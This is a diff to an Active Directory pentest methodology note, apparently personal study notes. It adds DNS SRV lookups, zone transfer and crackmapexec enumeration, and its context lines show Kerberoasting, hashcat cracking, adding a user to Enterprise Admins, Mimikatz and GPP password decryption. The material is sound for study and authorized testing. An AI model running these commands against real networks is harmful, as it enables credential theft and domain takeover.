@@ -1,5 +1,42 @@
 # Methodology
 
+## Reconnaissance
+
+### Local Network
+
+```bash
+# Find the PDC
+dig srv _ldap._tcp.pdc._msdcs.$FQDN_DOMAIN
+
+# Find the DC
+dig srv _ldap._tcp.dc._msdcs.$FQDN_DOMAIN
+
+# Find the GC (Group Catalog, i.e. DC with extended data)
+dig srv gc._msdcs.$FQDN_DOMAIN
+
+# Other ways to find services hosts that may be DCs 
+dig srv _kerberos._tcp.$FQDN_DOMAIN
+dig srv _kpasswd._tcp.$FQDN_DOMAIN
+dig srv _ldap._tcp.$FQDN_DOMAIN
+
+# Reverse lookup
+dig -x $IP
+
+# Enumerate DNS (similar to zone transfer) with any valid user creds
+crackmapexec smb -u $USERNAME -p $PASSWD -d $DOMAIN -M enum_dns
+
+# Zone Transfer
+dig axfr @$IP $FQDN_DOMAIN
+
+# Manually inspect DHCP broadcast and multicast packets
+```
+
+### Remote
+
+```bash
+
+```
+
 ## Enumeration
 
 ### Kali Commands
@@ -13,8 +50,6 @@ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 impacket-GetUserSPNs -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER:$PASS
 impacket-GetUserSPNs -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER -hashes ':$NTLM'
 hashcat hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
-
-
 
 # Convert net user output to user list
 tr -s ' ' '\n' < users.txt | sed '/^$/d'
@@ -66,7 +101,7 @@ ls \\$COMPUTERNAME\$SHARE\$DOMAIN\
 
 ### Local Access
 
-Once we have local access, we can run **[BloodHound](0%20Tools/BloodHound.md)**
+Once we have local access, we can run **[BloodHound](1%20Tools/BloodHound.md)**
 
 **PowerView**
 
@@ -133,7 +168,7 @@ net group "Enterprise Admins" mojo /add /domain
 
 ### Tools
 
-**[Mimikatz](0%20Tools/Local/Mimikatz.md)**
+**[Mimikatz](1%20Tools/Local/Mimikatz.md)**
 
 [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
 
@@ -156,7 +191,7 @@ exit
 vault::list
 ```
 
-**[gpp-decrypt](0%20Tools/gpp-decrypt.md)**
+**[gpp-decrypt](1%20Tools/gpp-decrypt.md)**
 
 Decrypts GPP credentials. Typically found in files like `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml`.
 
@@ -178,7 +213,7 @@ Decrypt with:
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
-**[Rubeus](0%20Tools/Local/Rubeus.md)**
+**[Rubeus](1%20Tools/Local/Rubeus.md)**
 
 Crack associated hashes in hashcat
 
